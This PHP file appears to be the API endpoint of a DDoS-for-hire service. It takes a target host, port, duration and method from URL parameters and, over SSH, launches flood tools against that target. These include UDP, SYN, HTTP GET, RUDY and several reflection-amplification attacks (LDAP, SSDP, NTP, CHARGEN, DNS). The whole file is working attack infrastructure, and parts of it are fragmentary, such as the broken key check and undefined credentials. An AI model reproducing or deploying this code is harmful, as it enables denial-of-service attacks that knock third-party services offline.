<?php
    // HANDLE API KEY //

        die(/*"ERR: INVALID KEY" *DEBUG* */);
    }

    if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {

        // SANITIZING VARIABLES //
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*60) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
        $domain = $_GET['host'];

        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP)) {
            die(/*"Invalid Domain" *DEBUG* */);
        }

        $smIP = str_replace(".", "", $ip);
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);

        // HANDLING SSH ATTACK COMMAND EXECUTION //
        if($_GET['method'] == "UDP") { $command = "screen -dmS {$smIP} ./udp {$ip} {$port} 1 500 3 {$time}"; }
        elseif($_GET['method'] == "LDAP") { $command = "screen -dmS {$smIP} ./ldap {$ip} {$port} ldapx.txt 15 -1 {$time}"; }
        elseif($_GET['method'] == "DOMINATE") { $command = "screen -dmS {$smIP} ./dominate {$ip} {$port} 3 -1 {$time}"; }
        elseif($_GET['method'] == "XSYN") { $command = "screen -dmS {$smIP} ./xsyn {$ip} {$port} 3 {$time}"; }
        elseif($_GET['method'] == "SSDP") { $command = "screen -dmS {$smIP} ./ssdp {$ip} {$port} ssdp.txt 3 {$time}"; }
        elseif($_GET['method'] == "CHARGEN") { $command = "screen -dmS {$smIP} ./chargen {$ip} {$port} chargen.txt 8 -1 {$time}"; }
        elseif($_GET['method'] == "NTP") { $command = "screen -dmS {$smIP} ./ntp {$ip} {$port} ntp.txt 3 {$time}"; }
        elseif($_GET['method'] == "VSE") { $command = "screen -dmS {$smIP} ./vse {$ip} 3 -1 {$time}"; }
        elseif($_GET['method'] == "RUDY") { $command = "screen -dmS {$smIP} ./rudy {$ip} 1 8 {$time} proxies.txt 0"; }
        elseif($_GET['method'] == "GET") { $command = "screen -dmS {$smIP} ./ghp {$ip} GET 1 8 {$time} proxies.txt 0"; }
        elseif($_GET['method'] == "DNS") { $command = "screen -dmS {$smIP} ./dns{$ip} {$port} ssdp.txt 3 {$time}"; }
        elseif($_GET['method'] == "SUDP") { $command = "screen -dmS {$smIP} ./sudp {$ip}{$port} 1 3 {$time}"; }
        elseif($_GET['method'] == "STOP") { $command = "screen -X -s {$smIP} quit"; }
        else die();

        // SERVER CONNECTION HANDLING //
 
        $conn = ssh2_connect($server, 22);
        if (!$conn) {
            die("CONN ERR");
        }




        // AUTHENTICATION CLAUSE //
        if (ssh2_auth_password($conn, $username, $password)) {
            /*echo "200 OK."; *DEBUG* */
        } else {
            die(/*'SSH Authentication Failed...' *DEBUG* */);
        }

        ssh2_exec($conn, $command);
    }
?>